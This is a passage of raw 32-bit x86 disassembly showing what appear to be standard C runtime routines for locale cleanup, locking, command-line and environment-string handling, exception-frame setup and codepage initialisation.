  41f2e9:	ret    
  41f2ea:	push   0xd
  41f2ec:	call   0x41fabe
  41f2f1:	pop    ecx
  41f2f2:	mov    DWORD PTR [ebp-0x4],esi
  41f2f5:	mov    esi,DWORD PTR [edi+0x68]
  41f2f8:	mov    DWORD PTR [ebp-0x1c],esi
  41f2fb:	cmp    esi,DWORD PTR ds:0x430fd4
  41f301:	je     0x41f337
  41f303:	test   esi,esi
  41f305:	je     0x41f31f
  41f307:	or     eax,0xffffffff
  41f30a:	lock xadd DWORD PTR [esi],eax
  41f30e:	jne    0x41f31f
  41f310:	cmp    esi,0x430db0
  41f316:	je     0x41f31f
  41f318:	push   esi
  41f319:	call   0x41f0cb
  41f31e:	pop    ecx
  41f31f:	mov    eax,ds:0x430fd4
  41f324:	mov    DWORD PTR [edi+0x68],eax
  41f327:	mov    esi,DWORD PTR ds:0x430fd4
  41f32d:	mov    DWORD PTR [ebp-0x1c],esi
  41f330:	xor    eax,eax
  41f332:	inc    eax
  41f333:	lock xadd DWORD PTR [esi],eax
  41f337:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f33e:	call   0x41f348
  41f343:	jmp    0x41f2d6
  41f345:	mov    esi,DWORD PTR [ebp-0x1c]
  41f348:	push   0xd
  41f34a:	call   0x421933
  41f34f:	pop    ecx
  41f350:	ret    
  41f351:	push   ebp
  41f352:	mov    ebp,esp
  41f354:	mov    ecx,DWORD PTR [ebp+0x8]
  41f357:	xor    eax,eax
  41f359:	cmp    ecx,DWORD PTR [eax*8+0x4310c8]
  41f360:	je     0x41f389
  41f362:	inc    eax
  41f363:	cmp    eax,0x2d
  41f366:	jb     0x41f359
  41f368:	lea    eax,[ecx-0x13]
  41f36b:	cmp    eax,0x11
  41f36e:	ja     0x41f375
  41f370:	push   0xd
  41f372:	pop    eax
  41f373:	pop    ebp
  41f374:	ret    
  41f375:	lea    eax,[ecx-0xbc]
  41f37b:	push   0xe
  41f37d:	pop    ecx
  41f37e:	cmp    ecx,eax
  41f380:	sbb    eax,eax
  41f382:	and    eax,ecx
  41f384:	add    eax,0x8
  41f387:	pop    ebp
  41f388:	ret    
  41f389:	mov    eax,DWORD PTR [eax*8+0x4310cc]
  41f390:	pop    ebp
  41f391:	ret    
  41f392:	push   ebp
  41f393:	mov    ebp,esp
  41f395:	push   ecx
  41f396:	push   ecx
  41f397:	cmp    DWORD PTR ds:0x433bf4,0x0
  41f39e:	jne    0x41f3a5
  41f3a0:	call   0x41ef5a
  41f3a5:	push   ebx
  41f3a6:	push   esi
  41f3a7:	push   edi
  41f3a8:	push   0x104
  41f3ad:	mov    edi,0x431ef8
  41f3b2:	xor    ebx,ebx
  41f3b4:	push   edi
  41f3b5:	push   ebx
  41f3b6:	mov    BYTE PTR ds:0x431ffc,bl
  41f3bc:	call   DWORD PTR ds:0x429074
  41f3c2:	mov    esi,DWORD PTR ds:0x433bfc
  41f3c8:	mov    DWORD PTR ds:0x431dd4,edi
  41f3ce:	test   esi,esi
  41f3d0:	je     0x41f3d6
  41f3d2:	cmp    BYTE PTR [esi],bl
  41f3d4:	jne    0x41f3d8
  41f3d6:	mov    esi,edi
  41f3d8:	lea    eax,[ebp-0x8]
  41f3db:	push   eax
  41f3dc:	lea    eax,[ebp-0x4]
  41f3df:	push   eax
  41f3e0:	push   ebx
  41f3e1:	push   ebx
  41f3e2:	push   esi
  41f3e3:	call   0x421c24
  41f3e8:	mov    ebx,DWORD PTR [ebp-0x4]
  41f3eb:	add    esp,0x14
  41f3ee:	cmp    ebx,0x3fffffff
  41f3f4:	jae    0x41f43b
  41f3f6:	mov    ecx,DWORD PTR [ebp-0x8]
  41f3f9:	cmp    ecx,0xffffffff
  41f3fc:	jae    0x41f43b
  41f3fe:	lea    edx,[ecx+ebx*4]
  41f401:	cmp    edx,ecx
  41f403:	jb     0x41f43b
  41f405:	push   edx
  41f406:	call   0x41fe7a
  41f40b:	mov    edi,eax
  41f40d:	pop    ecx
  41f40e:	test   edi,edi
  41f410:	je     0x41f43b
  41f412:	lea    eax,[ebp-0x8]
  41f415:	push   eax
  41f416:	lea    eax,[ebp-0x4]
  41f419:	push   eax
  41f41a:	lea    eax,[edi+ebx*4]
  41f41d:	push   eax
  41f41e:	push   edi
  41f41f:	push   esi
  41f420:	call   0x421c24
  41f425:	mov    eax,DWORD PTR [ebp-0x4]
  41f428:	add    esp,0x14
  41f42b:	dec    eax
  41f42c:	mov    DWORD PTR ds:0x431dc4,edi
  41f432:	mov    ds:0x431dc0,eax
  41f437:	xor    eax,eax
  41f439:	jmp    0x41f43e
  41f43b:	or     eax,0xffffffff
  41f43e:	pop    edi
  41f43f:	pop    esi
  41f440:	pop    ebx
  41f441:	mov    esp,ebp
  41f443:	pop    ebp
  41f444:	ret    
  41f445:	push   ebp
  41f446:	mov    ebp,esp
  41f448:	push   DWORD PTR [ebp+0x8]
  41f44b:	call   0x420b5b
  41f450:	neg    eax
  41f452:	pop    ecx
  41f453:	sbb    eax,eax
  41f455:	neg    eax
  41f457:	dec    eax
  41f458:	pop    ebp
  41f459:	ret    
  41f45a:	push   0x8
  41f45c:	push   0x42da78
  41f461:	call   0x4221c0
  41f466:	cmp    DWORD PTR ds:0x431df0,0x0
  41f46d:	jne    0x41f487
  41f46f:	call   0x420cde
  41f474:	push   0x1e
  41f476:	call   0x4202d3
  41f47b:	push   0xff
  41f480:	call   0x4211cb
  41f485:	pop    ecx
  41f486:	pop    ecx
  41f487:	mov    edi,DWORD PTR [ebp+0x8]
  41f48a:	xor    ebx,ebx
  41f48c:	cmp    DWORD PTR [edi*8+0x430860],ebx
  41f493:	jne    0x41f4f1
  41f495:	push   0x18
  41f497:	call   0x41fe7a
  41f49c:	pop    ecx
  41f49d:	mov    esi,eax
  41f49f:	test   esi,esi
  41f4a1:	jne    0x41f4b2
  41f4a3:	call   0x41fb32
  41f4a8:	mov    DWORD PTR [eax],0xc
  41f4ae:	xor    eax,eax
  41f4b0:	jmp    0x41f4f4
  41f4b2:	push   0xa
  41f4b4:	call   0x41fabe
  41f4b9:	pop    ecx
  41f4ba:	mov    DWORD PTR [ebp-0x4],ebx
  41f4bd:	cmp    DWORD PTR [edi*8+0x430860],ebx
  41f4c4:	jne    0x41f4de
  41f4c6:	push   ebx
  41f4c7:	push   0xfa0
  41f4cc:	push   esi
  41f4cd:	call   0x421e72
  41f4d2:	add    esp,0xc
  41f4d5:	mov    DWORD PTR [edi*8+0x430860],esi
  41f4dc:	jmp    0x41f4e5
  41f4de:	push   esi
  41f4df:	call   0x41f0cb
  41f4e4:	pop    ecx
  41f4e5:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f4ec:	call   0x41f4fa
  41f4f1:	xor    eax,eax
  41f4f3:	inc    eax
  41f4f4:	call   0x422205
  41f4f9:	ret    
  41f4fa:	push   0xa
  41f4fc:	call   0x421933
  41f501:	pop    ecx
  41f502:	ret    
  41f503:	push   ebp
  41f504:	mov    ebp,esp
  41f506:	push   esi
  41f507:	mov    esi,DWORD PTR [ebp+0x8]
  41f50a:	test   esi,esi
  41f50c:	je     0x41f880
  41f512:	push   DWORD PTR [esi+0x4]
  41f515:	call   0x41f0cb
  41f51a:	push   DWORD PTR [esi+0x8]
  41f51d:	call   0x41f0cb
  41f522:	push   DWORD PTR [esi+0xc]
  41f525:	call   0x41f0cb
  41f52a:	push   DWORD PTR [esi+0x10]
  41f52d:	call   0x41f0cb
  41f532:	push   DWORD PTR [esi+0x14]
  41f535:	call   0x41f0cb
  41f53a:	push   DWORD PTR [esi+0x18]
  41f53d:	call   0x41f0cb
  41f542:	push   DWORD PTR [esi]
  41f544:	call   0x41f0cb
  41f549:	push   DWORD PTR [esi+0x20]
  41f54c:	call   0x41f0cb
  41f551:	push   DWORD PTR [esi+0x24]
  41f554:	call   0x41f0cb
  41f559:	push   DWORD PTR [esi+0x28]
  41f55c:	call   0x41f0cb
  41f561:	push   DWORD PTR [esi+0x2c]
  41f564:	call   0x41f0cb
  41f569:	push   DWORD PTR [esi+0x30]
  41f56c:	call   0x41f0cb
  41f571:	push   DWORD PTR [esi+0x34]
  41f574:	call   0x41f0cb
  41f579:	push   DWORD PTR [esi+0x1c]
  41f57c:	call   0x41f0cb
  41f581:	push   DWORD PTR [esi+0x38]
  41f584:	call   0x41f0cb
  41f589:	push   DWORD PTR [esi+0x3c]
  41f58c:	call   0x41f0cb
  41f591:	add    esp,0x40
  41f594:	push   DWORD PTR [esi+0x40]
  41f597:	call   0x41f0cb
  41f59c:	push   DWORD PTR [esi+0x44]
  41f59f:	call   0x41f0cb
  41f5a4:	push   DWORD PTR [esi+0x48]
  41f5a7:	call   0x41f0cb
  41f5ac:	push   DWORD PTR [esi+0x4c]
  41f5af:	call   0x41f0cb
  41f5b4:	push   DWORD PTR [esi+0x50]
  41f5b7:	call   0x41f0cb
  41f5bc:	push   DWORD PTR [esi+0x54]
  41f5bf:	call   0x41f0cb
  41f5c4:	push   DWORD PTR [esi+0x58]
  41f5c7:	call   0x41f0cb
  41f5cc:	push   DWORD PTR [esi+0x5c]
  41f5cf:	call   0x41f0cb
  41f5d4:	push   DWORD PTR [esi+0x60]
  41f5d7:	call   0x41f0cb
  41f5dc:	push   DWORD PTR [esi+0x64]
  41f5df:	call   0x41f0cb
  41f5e4:	push   DWORD PTR [esi+0x68]
  41f5e7:	call   0x41f0cb
  41f5ec:	push   DWORD PTR [esi+0x6c]
  41f5ef:	call   0x41f0cb
  41f5f4:	push   DWORD PTR [esi+0x70]
  41f5f7:	call   0x41f0cb
  41f5fc:	push   DWORD PTR [esi+0x74]
  41f5ff:	call   0x41f0cb
  41f604:	push   DWORD PTR [esi+0x78]
  41f607:	call   0x41f0cb
  41f60c:	push   DWORD PTR [esi+0x7c]
  41f60f:	call   0x41f0cb
  41f614:	add    esp,0x40
  41f617:	push   DWORD PTR [esi+0x80]
  41f61d:	call   0x41f0cb
  41f622:	push   DWORD PTR [esi+0x84]
  41f628:	call   0x41f0cb
  41f62d:	push   DWORD PTR [esi+0x88]
  41f633:	call   0x41f0cb
  41f638:	push   DWORD PTR [esi+0x8c]
  41f63e:	call   0x41f0cb
  41f643:	push   DWORD PTR [esi+0x90]
  41f649:	call   0x41f0cb
  41f64e:	push   DWORD PTR [esi+0x94]
  41f654:	call   0x41f0cb
  41f659:	push   DWORD PTR [esi+0x98]
  41f65f:	call   0x41f0cb
  41f664:	push   DWORD PTR [esi+0x9c]
  41f66a:	call   0x41f0cb
  41f66f:	push   DWORD PTR [esi+0xa0]
  41f675:	call   0x41f0cb
  41f67a:	push   DWORD PTR [esi+0xa4]
  41f680:	call   0x41f0cb
  41f685:	push   DWORD PTR [esi+0xa8]
  41f68b:	call   0x41f0cb
  41f690:	push   DWORD PTR [esi+0xb8]
  41f696:	call   0x41f0cb
  41f69b:	push   DWORD PTR [esi+0xbc]
  41f6a1:	call   0x41f0cb
  41f6a6:	push   DWORD PTR [esi+0xc0]
  41f6ac:	call   0x41f0cb
  41f6b1:	push   DWORD PTR [esi+0xc4]
  41f6b7:	call   0x41f0cb
  41f6bc:	push   DWORD PTR [esi+0xc8]
  41f6c2:	call   0x41f0cb
  41f6c7:	add    esp,0x40
  41f6ca:	push   DWORD PTR [esi+0xcc]
  41f6d0:	call   0x41f0cb
  41f6d5:	push   DWORD PTR [esi+0xb4]
  41f6db:	call   0x41f0cb
  41f6e0:	push   DWORD PTR [esi+0xd4]
  41f6e6:	call   0x41f0cb
  41f6eb:	push   DWORD PTR [esi+0xd8]
  41f6f1:	call   0x41f0cb
  41f6f6:	push   DWORD PTR [esi+0xdc]
  41f6fc:	call   0x41f0cb
  41f701:	push   DWORD PTR [esi+0xe0]
  41f707:	call   0x41f0cb
  41f70c:	push   DWORD PTR [esi+0xe4]
  41f712:	call   0x41f0cb
  41f717:	push   DWORD PTR [esi+0xe8]
  41f71d:	call   0x41f0cb
  41f722:	push   DWORD PTR [esi+0xd0]
  41f728:	call   0x41f0cb
  41f72d:	push   DWORD PTR [esi+0xec]
  41f733:	call   0x41f0cb
  41f738:	push   DWORD PTR [esi+0xf0]
  41f73e:	call   0x41f0cb
  41f743:	push   DWORD PTR [esi+0xf4]
  41f749:	call   0x41f0cb
  41f74e:	push   DWORD PTR [esi+0xf8]
  41f754:	call   0x41f0cb
  41f759:	push   DWORD PTR [esi+0xfc]
  41f75f:	call   0x41f0cb
  41f764:	push   DWORD PTR [esi+0x100]
  41f76a:	call   0x41f0cb
  41f76f:	push   DWORD PTR [esi+0x104]
  41f775:	call   0x41f0cb
  41f77a:	add    esp,0x40
  41f77d:	push   DWORD PTR [esi+0x108]
  41f783:	call   0x41f0cb
  41f788:	push   DWORD PTR [esi+0x10c]
  41f78e:	call   0x41f0cb
  41f793:	push   DWORD PTR [esi+0x110]
  41f799:	call   0x41f0cb
  41f79e:	push   DWORD PTR [esi+0x114]
  41f7a4:	call   0x41f0cb
  41f7a9:	push   DWORD PTR [esi+0x118]
  41f7af:	call   0x41f0cb
  41f7b4:	push   DWORD PTR [esi+0x11c]
  41f7ba:	call   0x41f0cb
  41f7bf:	push   DWORD PTR [esi+0x120]
  41f7c5:	call   0x41f0cb
  41f7ca:	push   DWORD PTR [esi+0x124]
  41f7d0:	call   0x41f0cb
  41f7d5:	push   DWORD PTR [esi+0x128]
  41f7db:	call   0x41f0cb
  41f7e0:	push   DWORD PTR [esi+0x12c]
  41f7e6:	call   0x41f0cb
  41f7eb:	push   DWORD PTR [esi+0x130]
  41f7f1:	call   0x41f0cb
  41f7f6:	push   DWORD PTR [esi+0x134]
  41f7fc:	call   0x41f0cb
  41f801:	push   DWORD PTR [esi+0x138]
  41f807:	call   0x41f0cb
  41f80c:	push   DWORD PTR [esi+0x13c]
  41f812:	call   0x41f0cb
  41f817:	push   DWORD PTR [esi+0x140]
  41f81d:	call   0x41f0cb
  41f822:	push   DWORD PTR [esi+0x144]
  41f828:	call   0x41f0cb
  41f82d:	add    esp,0x40
  41f830:	push   DWORD PTR [esi+0x148]
  41f836:	call   0x41f0cb
  41f83b:	push   DWORD PTR [esi+0x14c]
  41f841:	call   0x41f0cb
  41f846:	push   DWORD PTR [esi+0x150]
  41f84c:	call   0x41f0cb
  41f851:	push   DWORD PTR [esi+0x154]
  41f857:	call   0x41f0cb
  41f85c:	push   DWORD PTR [esi+0x158]
  41f862:	call   0x41f0cb
  41f867:	push   DWORD PTR [esi+0x15c]
  41f86d:	call   0x41f0cb
  41f872:	push   DWORD PTR [esi+0x160]
  41f878:	call   0x41f0cb
  41f87d:	add    esp,0x1c
  41f880:	pop    esi
  41f881:	pop    ebp
  41f882:	ret    
  41f883:	push   ebp
  41f884:	mov    ebp,esp
  41f886:	push   0x0
  41f888:	push   0x1
  41f88a:	push   DWORD PTR [ebp+0x8]
  41f88d:	call   0x421af5
  41f892:	add    esp,0xc
  41f895:	pop    ebp
  41f896:	ret    
  41f897:	push   0x8
  41f899:	push   0x42da58
  41f89e:	call   0x4221c0
  41f8a3:	call   0x42150f
  41f8a8:	mov    eax,DWORD PTR [eax+0x78]
  41f8ab:	test   eax,eax
  41f8ad:	je     0x41f8c5
  41f8af:	and    DWORD PTR [ebp-0x4],0x0
  41f8b3:	call   eax
  41f8b5:	jmp    0x41f8be
  41f8b7:	xor    eax,eax
  41f8b9:	inc    eax
  41f8ba:	ret    
  41f8bb:	mov    esp,DWORD PTR [ebp-0x18]
  41f8be:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f8c5:	call   0x420c9b
  41f8ca:	int3   
  41f8cb:	int3   
  41f8cc:	int3   
  41f8cd:	int3   
  41f8ce:	int3   
  41f8cf:	int3   
  41f8d0:	push   ebp
  41f8d1:	mov    ebp,esp
  41f8d3:	push   0xfffffffe
  41f8d5:	push   0x42daf8
  41f8da:	push   0x420530
  41f8df:	mov    eax,fs:0x0
  41f8e5:	push   eax
  41f8e6:	sub    esp,0x8
  41f8e9:	push   ebx
  41f8ea:	push   esi
  41f8eb:	push   edi
  41f8ec:	mov    eax,ds:0x4314e0
  41f8f1:	xor    DWORD PTR [ebp-0x8],eax
  41f8f4:	xor    eax,ebp
  41f8f6:	push   eax
  41f8f7:	lea    eax,[ebp-0x10]
  41f8fa:	mov    fs:0x0,eax
  41f900:	mov    DWORD PTR [ebp-0x18],esp
  41f903:	mov    DWORD PTR [ebp-0x4],0x0
  41f90a:	push   0x400000
  41f90f:	call   0x421890
  41f914:	add    esp,0x4
  41f917:	test   eax,eax
  41f919:	je     0x41f96f
  41f91b:	mov    eax,DWORD PTR [ebp+0x8]
  41f91e:	sub    eax,0x400000
  41f923:	push   eax
  41f924:	push   0x400000
  41f929:	call   0x420c50
  41f92e:	add    esp,0x8
  41f931:	test   eax,eax
  41f933:	je     0x41f96f
  41f935:	mov    eax,DWORD PTR [eax+0x24]
  41f938:	shr    eax,0x1f
  41f93b:	not    eax
  41f93d:	and    eax,0x1
  41f940:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f947:	mov    ecx,DWORD PTR [ebp-0x10]
  41f94a:	mov    DWORD PTR fs:0x0,ecx
  41f951:	pop    ecx
  41f952:	pop    edi
  41f953:	pop    esi
  41f954:	pop    ebx
  41f955:	mov    esp,ebp
  41f957:	pop    ebp
  41f958:	ret    
  41f959:	mov    eax,DWORD PTR [ebp-0x14]
  41f95c:	mov    eax,DWORD PTR [eax]
  41f95e:	xor    ecx,ecx
  41f960:	cmp    DWORD PTR [eax],0xc0000005
  41f966:	sete   cl
  41f969:	mov    eax,ecx
  41f96b:	ret    
  41f96c:	mov    esp,DWORD PTR [ebp-0x18]
  41f96f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41f976:	xor    eax,eax
  41f978:	mov    ecx,DWORD PTR [ebp-0x10]
  41f97b:	mov    DWORD PTR fs:0x0,ecx
  41f982:	pop    ecx
  41f983:	pop    edi
  41f984:	pop    esi
  41f985:	pop    ebx
  41f986:	mov    esp,ebp
  41f988:	pop    ebp
  41f989:	ret    
  41f98a:	push   ebp
  41f98b:	mov    ebp,esp
  41f98d:	push   esi
  41f98e:	mov    esi,DWORD PTR [ebp+0x8]
  41f991:	xor    eax,eax
  41f993:	jmp    0x41f9a4
  41f995:	test   eax,eax
  41f997:	jne    0x41f9a9
  41f999:	mov    ecx,DWORD PTR [esi]
  41f99b:	test   ecx,ecx
  41f99d:	je     0x41f9a1
  41f99f:	call   ecx
  41f9a1:	add    esi,0x4
  41f9a4:	cmp    esi,DWORD PTR [ebp+0xc]
  41f9a7:	jb     0x41f995
  41f9a9:	pop    esi
  41f9aa:	pop    ebp
  41f9ab:	ret    
  41f9ac:	push   ebp
  41f9ad:	mov    ebp,esp
  41f9af:	mov    eax,DWORD PTR [ebp+0x8]
  41f9b2:	mov    ds:0x4327b4,eax
  41f9b7:	mov    ds:0x4327b8,eax
  41f9bc:	mov    ds:0x4327bc,eax
  41f9c1:	mov    ds:0x4327c0,eax
  41f9c6:	pop    ebp
  41f9c7:	ret    
  41f9c8:	call   DWORD PTR ds:0x429060
  41f9ce:	xor    ecx,ecx
  41f9d0:	mov    ds:0x431df0,eax
  41f9d5:	test   eax,eax
  41f9d7:	setne  cl
  41f9da:	mov    eax,ecx
  41f9dc:	ret    
  41f9dd:	push   ebp
  41f9de:	mov    ebp,esp
  41f9e0:	push   ecx
  41f9e1:	push   edi
  41f9e2:	call   DWORD PTR ds:0x42908c
  41f9e8:	mov    edi,eax
  41f9ea:	xor    eax,eax
  41f9ec:	test   edi,edi
  41f9ee:	je     0x41fa65
  41f9f0:	push   esi
  41f9f1:	mov    esi,edi
  41f9f3:	cmp    WORD PTR [edi],ax
  41f9f6:	je     0x41fa08
  41f9f8:	add    esi,0x2
  41f9fb:	cmp    WORD PTR [esi],ax
  41f9fe:	jne    0x41f9f8
  41fa00:	add    esi,0x2
  41fa03:	cmp    WORD PTR [esi],ax
  41fa06:	jne    0x41f9f8
  41fa08:	push   ebx
  41fa09:	push   eax
  41fa0a:	push   eax
  41fa0b:	push   eax
  41fa0c:	sub    esi,edi
  41fa0e:	push   eax
  41fa0f:	sar    esi,1
  41fa11:	inc    esi
  41fa12:	push   esi
  41fa13:	push   edi
  41fa14:	push   eax
  41fa15:	push   eax
  41fa16:	call   DWORD PTR ds:0x42905c
  41fa1c:	mov    DWORD PTR [ebp-0x4],eax
  41fa1f:	test   eax,eax
  41fa21:	je     0x41fa5a
  41fa23:	push   eax
  41fa24:	call   0x41fe7a
  41fa29:	mov    ebx,eax
  41fa2b:	pop    ecx
  41fa2c:	test   ebx,ebx
  41fa2e:	je     0x41fa5a
  41fa30:	xor    eax,eax
  41fa32:	push   eax
  41fa33:	push   eax
  41fa34:	push   DWORD PTR [ebp-0x4]
  41fa37:	push   ebx
  41fa38:	push   esi
  41fa39:	push   edi
  41fa3a:	push   eax
  41fa3b:	push   eax
  41fa3c:	call   DWORD PTR ds:0x42905c
  41fa42:	test   eax,eax
  41fa44:	jne    0x41fa4f
  41fa46:	push   ebx
  41fa47:	call   0x41f0cb
  41fa4c:	pop    ecx
  41fa4d:	xor    ebx,ebx
  41fa4f:	push   edi
  41fa50:	call   DWORD PTR ds:0x429090
  41fa56:	mov    eax,ebx
  41fa58:	jmp    0x41fa63
  41fa5a:	push   edi
  41fa5b:	call   DWORD PTR ds:0x429090
  41fa61:	xor    eax,eax
  41fa63:	pop    ebx
  41fa64:	pop    esi
  41fa65:	pop    edi
  41fa66:	mov    esp,ebp
  41fa68:	pop    ebp
  41fa69:	ret    
  41fa6a:	push   ebp
  41fa6b:	mov    ebp,esp
  41fa6d:	push   ecx
  41fa6e:	lea    eax,[ebp-0x4]
  41fa71:	push   eax
  41fa72:	push   0x429ec0
  41fa77:	push   0x0
  41fa79:	call   DWORD PTR ds:0x429050
  41fa7f:	test   eax,eax
  41fa81:	je     0x41fa9a
  41fa83:	push   0x429ed8
  41fa88:	push   DWORD PTR [ebp-0x4]
  41fa8b:	call   DWORD PTR ds:0x429054
  41fa91:	test   eax,eax
  41fa93:	je     0x41fa9a
  41fa95:	push   DWORD PTR [ebp+0x8]
  41fa98:	call   eax
  41fa9a:	mov    esp,ebp
  41fa9c:	pop    ebp
  41fa9d:	ret    
  41fa9e:	push   esi
  41fa9f:	push   edi
  41faa0:	mov    esi,0x42d9a0
  41faa5:	mov    edi,0x42d9a0
  41faaa:	jmp    0x41fab7
  41faac:	mov    eax,DWORD PTR [esi]
  41faae:	test   eax,eax
  41fab0:	je     0x41fab4
  41fab2:	call   eax
  41fab4:	add    esi,0x4
  41fab7:	cmp    esi,edi
  41fab9:	jb     0x41faac
  41fabb:	pop    edi
  41fabc:	pop    esi
  41fabd:	ret    
  41fabe:	push   ebp
  41fabf:	mov    ebp,esp
  41fac1:	push   esi
  41fac2:	mov    esi,DWORD PTR [ebp+0x8]
  41fac5:	cmp    DWORD PTR [esi*8+0x430860],0x0
  41facd:	jne    0x41fae2
  41facf:	push   esi
  41fad0:	call   0x41f45a
  41fad5:	pop    ecx
  41fad6:	test   eax,eax
  41fad8:	jne    0x41fae2
  41fada:	push   0x11
  41fadc:	call   0x421176
  41fae1:	pop    ecx
  41fae2:	push   DWORD PTR [esi*8+0x430860]
  41fae9:	call   DWORD PTR ds:0x4290c0
  41faef:	pop    esi
  41faf0:	pop    ebp
  41faf1:	ret    
  41faf2:	push   ebp
  41faf3:	mov    ebp,esp
  41faf5:	sub    esp,0x10
  41faf8:	push   DWORD PTR [ebp+0x8]
  41fafb:	lea    ecx,[ebp-0x10]
  41fafe:	call   0x4207b2
  41fb03:	push   DWORD PTR [ebp+0x20]
  41fb06:	lea    eax,[ebp-0x10]
  41fb09:	push   DWORD PTR [ebp+0x1c]
  41fb0c:	push   DWORD PTR [ebp+0x18]
  41fb0f:	push   DWORD PTR [ebp+0x14]
  41fb12:	push   DWORD PTR [ebp+0x10]
  41fb15:	push   DWORD PTR [ebp+0xc]
  41fb18:	push   eax
  41fb19:	call   0x423094
  41fb1e:	add    esp,0x1c
  41fb21:	cmp    BYTE PTR [ebp-0x4],0x0
  41fb25:	je     0x41fb2e
  41fb27:	mov    ecx,DWORD PTR [ebp-0x8]
  41fb2a:	and    DWORD PTR [ecx+0x70],0xfffffffd
  41fb2e:	mov    esp,ebp
  41fb30:	pop    ebp
  41fb31:	ret    
  41fb32:	call   0x420bdf
  41fb37:	test   eax,eax
  41fb39:	jne    0x41fb41
  41fb3b:	mov    eax,0x431230
  41fb40:	ret    
  41fb41:	add    eax,0x8
  41fb44:	ret    
  41fb45:	push   0x17
  41fb47:	call   0x41ef40
  41fb4c:	test   eax,eax
  41fb4e:	je     0x41fb55
  41fb50:	push   0x5
  41fb52:	pop    ecx
  41fb53:	int    0x29
  41fb55:	push   esi
  41fb56:	push   0x1
  41fb58:	mov    esi,0xc0000417
  41fb5d:	push   esi
  41fb5e:	push   0x2
  41fb60:	call   0x4224fd
  41fb65:	push   esi
  41fb66:	call   0x422187
  41fb6b:	add    esp,0x10
  41fb6e:	pop    esi
  41fb6f:	ret    
  41fb70:	push   0x41f897
  41fb75:	call   DWORD PTR ds:0x429044
  41fb7b:	mov    ds:0x432634,eax
  41fb80:	ret    
  41fb81:	push   ebp
  41fb82:	mov    ebp,esp
  41fb84:	sub    esp,0x20
  41fb87:	mov    eax,ds:0x4314e0
  41fb8c:	xor    eax,ebp
  41fb8e:	mov    DWORD PTR [ebp-0x4],eax
  41fb91:	push   ebx
  41fb92:	push   esi
  41fb93:	push   DWORD PTR [ebp+0x8]
  41fb96:	mov    esi,DWORD PTR [ebp+0xc]
  41fb99:	call   0x42229e
  41fb9e:	mov    ebx,eax
  41fba0:	pop    ecx
  41fba1:	test   ebx,ebx
  41fba3:	jne    0x41fbb3
  41fba5:	push   esi
  41fba6:	call   0x42230c
  41fbab:	pop    ecx
  41fbac:	xor    eax,eax
  41fbae:	jmp    0x41fd5c
  41fbb3:	push   edi
  41fbb4:	xor    edi,edi
  41fbb6:	mov    ecx,edi
  41fbb8:	mov    eax,edi
  41fbba:	mov    DWORD PTR [ebp-0x1c],ecx
  41fbbd:	cmp    DWORD PTR [eax+0x430fd8],ebx
  41fbc3:	je     0x41fcb1
  41fbc9:	inc    ecx
  41fbca:	add    eax,0x30
  41fbcd:	mov    DWORD PTR [ebp-0x1c],ecx
  41fbd0:	cmp    eax,0xf0
  41fbd5:	jb     0x41fbbd
  41fbd7:	cmp    ebx,0xfde8
  41fbdd:	je     0x41fca9
  41fbe3:	cmp    ebx,0xfde9
  41fbe9:	je     0x41fca9
  41fbef:	movzx  eax,bx
  41fbf2:	push   eax
  41fbf3:	call   DWORD PTR ds:0x4290cc
  41fbf9:	test   eax,eax
  41fbfb:	je     0x41fca9
  41fc01:	lea    eax,[ebp-0x18]
  41fc04:	push   eax
  41fc05:	push   ebx
  41fc06:	call   DWORD PTR ds:0x4290d8
  41fc0c:	test   eax,eax
  41fc0e:	je     0x41fc96
  41fc14:	push   0x101
  41fc19:	lea    eax,[esi+0x18]
  41fc1c:	push   edi
  41fc1d:	push   eax
  41fc1e:	call   0x423190
  41fc23:	mov    DWORD PTR [esi+0x4],ebx
  41fc26:	add    esp,0xc
  41fc29:	xor    ebx,ebx
  41fc2b:	mov    DWORD PTR [esi+0x21c],edi
  41fc31:	inc    ebx
  41fc32:	cmp    DWORD PTR [ebp-0x18],ebx
  41fc35:	jbe    0x41fc86
  41fc37:	cmp    BYTE PTR [ebp-0x12],0x0
  41fc3b:	lea    eax,[ebp-0x12]
  41fc3e:	je     0x41fc61
  41fc40:	mov    cl,BYTE PTR [eax+0x1]
  41fc43:	test   cl,cl
  41fc45:	je     0x41fc61
  41fc47:	movzx  edx,cl
  41fc4a:	movzx  ecx,BYTE PTR [eax]
  41fc4d:	jmp    0x41fc55
  41fc4f:	or     BYTE PTR [esi+ecx*1+0x19],0x4
  41fc54:	inc    ecx
  41fc55:	cmp    ecx,edx
  41fc57:	jbe    0x41fc4f
  41fc59:	add    eax,0x2
  41fc5c:	cmp    BYTE PTR [eax],0x0
  41fc5f:	jne    0x41fc40
  41fc61:	lea    eax,[esi+0x1a]
  41fc64:	mov    ecx,0xfe
  41fc69:	or     BYTE PTR [eax],0x8
  41fc6c:	inc    eax
  41fc6d:	dec    ecx
  41fc6e:	jne    0x41fc69
  41fc70:	push   DWORD PTR [esi+0x4]
  41fc73:	call   0x422264
  41fc78:	add    esp,0x4
  41fc7b:	mov    DWORD PTR [esi+0x21c],eax
  41fc81:	mov    DWORD PTR [esi+0x8],ebx
  41fc84:	jmp    0x41fc89
  41fc86:	mov    DWORD PTR [esi+0x8],edi
  41fc89:	xor    eax,eax
  41fc8b:	lea    edi,[esi+0xc]
  41fc8e:	stos   DWORD PTR es:[edi],eax
  41fc8f:	stos   DWORD PTR es:[edi],eax
  41fc90:	stos   DWORD PTR es:[edi],eax
  41fc91:	jmp    0x41fd52
  41fc96:	cmp    DWORD PTR ds:0x4327a4,edi
  41fc9c:	je     0x41fca9
  41fc9e:	push   esi
  41fc9f:	call   0x42230c
  41fca4:	jmp    0x41fd58
  41fca9:	or     eax,0xffffffff
  41fcac:	jmp    0x41fd5b
  41fcb1:	push   0x101
  41fcb6:	lea    eax,[esi+0x18]
  41fcb9:	push   edi
  41fcba:	push   eax
  41fcbb:	call   0x423190
  41fcc0:	add    esp,0xc
  41fcc3:	imul   eax,DWORD PTR [ebp-0x1c],0x30
  41fcc7:	mov    DWORD PTR [ebp-0x20],eax
  41fcca:	lea    eax,[eax+0x430fe8]
  41fcd0:	mov    DWORD PTR [ebp-0x1c],eax
  41fcd3:	cmp    BYTE PTR [eax],0x0
  41fcd6:	mov    ecx,eax
  41fcd8:	je     0x41fd0f
  41fcda:	mov    al,BYTE PTR [ecx+0x1]
  41fcdd:	test   al,al
